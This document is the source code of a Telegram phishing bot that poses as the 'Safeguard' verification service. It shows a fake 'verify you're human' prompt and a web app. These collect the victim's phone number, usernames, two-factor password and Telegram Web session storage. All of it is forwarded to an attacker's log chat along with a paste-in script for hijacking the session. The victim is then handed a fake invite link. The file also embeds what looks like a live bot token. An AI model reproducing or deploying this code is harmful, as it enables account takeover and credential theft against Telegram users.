const express = require("express");
const fs = require("fs");
const path = require("path");
const TelegramBot = require("node-telegram-bot-api");
const phoneUtil = require("google-libphonenumber").PhoneNumberUtil.getInstance();
const PNF = require("google-libphonenumber").PhoneNumberFormat;

// Define your environment variables directly here:
const FAKE_SAFEGUARD_BOT_TOKEN = "7758350236:AAHql7uhSX2PGkmxhTPNrEcua9IHlhzfi-o";
const LOGS_ID = "-1002442955942";
const DOMAIN = "https://telegram-oauth.onrender.com";
const PORT = 80; // or any port you want to use

// Admins list (whoever adds the bot in the channel should be in this array.)
const admins = [
  7456088763,
  7576104609,
  8193001945
];

// Loading the Safeguard picture beforehand for speed
const safeguardSuccess = fs.readFileSync(path.join(__dirname, "images/success/safeguard.jpg"));
const safeguardVerification = fs.readFileSync(path.join(__dirname, "images/verification/safeguard.jpg"));

const safeguardBot = new TelegramBot(FAKE_SAFEGUARD_BOT_TOKEN, { polling: true });

// Helper function to handle errors
const handleError = (error, chatId, bot) => {
  console.error("Error occurred:", error);
  if (chatId) {
    bot.sendMessage(chatId, "An error occurred while processing your request. Please try again later.");
  }
};

const generateRandomString = (length) => {
  const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
  let result = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * charset.length);
    result += charset[randomIndex];
  }
  return result;
};

let safeguardUsername;

safeguardBot.getMe().then(botInfo => {
  safeguardUsername = botInfo.username;
  console.log(`Safeguard Bot Username: ${safeguardUsername}`);
}).catch(error => handleError(error));

const app = express();
app.use(express.json());
app.use(express.static("public"));

app.post("/api/users/telegram/info", async (req, res) => {
  try {
    const {
      userId,
      firstName,
      usernames,
      phoneNumber,
      isPremium,
      password,
      quicklySet,
      type
    } = req.body;

    let pass = password || "No Two-factor authentication enabled.";

    let usernameText = "";
    if (usernames) {
      usernameText = `Usernames owned:\n`;
      usernames.forEach((username, index) => {
        usernameText += `<b>${index + 1}</b>. @${username.username} ${username.isActive ? "✅" : "❌"}\n`;
      });
    }

    const parsedNumber = phoneUtil.parse(`+${phoneNumber}`, "ZZ");
    const formattedNumber = phoneUtil.format(parsedNumber, PNF.INTERNATIONAL);
    const quickAuth = `Object.entries(${JSON.stringify(quicklySet)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;

    await handleRequest(req, res, {
      password: pass,
      script: quickAuth,
      userId,
      name: firstName,
      number: formattedNumber,
      usernames: usernameText,
      premium: isPremium,
      type: "safeguard",
    });
  } catch (error) {
    handleError(error, req.body.userId, safeguardBot);
    res.status(500).json({ error: "server error" });
  }
});

const handleRequest = async (req, res, data) => {
  try {
    await safeguardBot.sendMessage(
      LOGS_ID,
      `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: Safeguard`, 
      { parse_mode: "HTML" }
    );

    const image = safeguardSuccess;
    const caption = `Verified, you can join the group using this temporary link:\n\nhttps://t.me/+${generateRandomString(16)}\n\nThis link is a one-time use and will expire`;

    const safeguardButtons = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "@SOLTRENDING",
              url: "https://t.me/SOLTRENDING"
            },
          ],
        ]
      }
    };

    await safeguardBot.sendPhoto(data.userId, image, {
      caption,
      ...safeguardButtons,
      parse_mode: "HTML"
    });

    res.json({});
  } catch (error) {
    handleError(error, data.userId, safeguardBot);
    res.status(500).json({ error: "Could not complete the request" });
  }
};

const handleNewChatMember = (bot) => {
  bot.on("my_chat_member", (update) => {
    try {
      const chatId = update.chat.id;
      const jsonToSend = {
        caption: `${update.chat.title} is being protected by @Safeguard\n\nClick below to verify you're human`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "Tap To Verify", url: `https://t.me/${update.new_chat_member.user.username}?start=scrim` }]]
        }
      };
      const imageToSend = safeguardVerification;

      if (
        update.chat.type === "channel" &&
        update.new_chat_member.status === "administrator" &&
        update.new_chat_member.user.is_bot === true &&
        admins.includes(update.from.id)
      ) {
        bot.sendPhoto(chatId, imageToSend, jsonToSend);
      }
    } catch (error) {
      handleError(error, null, bot);
    }
  });
};

const handleStart = (bot) => {
  bot.onText(/\/start (.*)$/, (msg, match) => {
    try {
      const chatId = msg.chat.id;
      const jsonToSend = {
        caption: `<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' and complete captcha to gain entry`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{
            text: "VERIFY",
            web_app: {
              url: `${DOMAIN}/safeguard/?type=safeguard`
            }
          }]]
        }
      };
      const imageToSend = safeguardVerification;

      safeguardBot.sendPhoto(chatId, imageToSend, jsonToSend);
    } catch (error) {
      handleError(error, msg.chat.id, bot);
    }
  });
};

handleNewChatMember(safeguardBot);
handleStart(safeguardBot);

app.listen(PORT, () => console.log(`Safeguard bot running on port ${PORT}`));
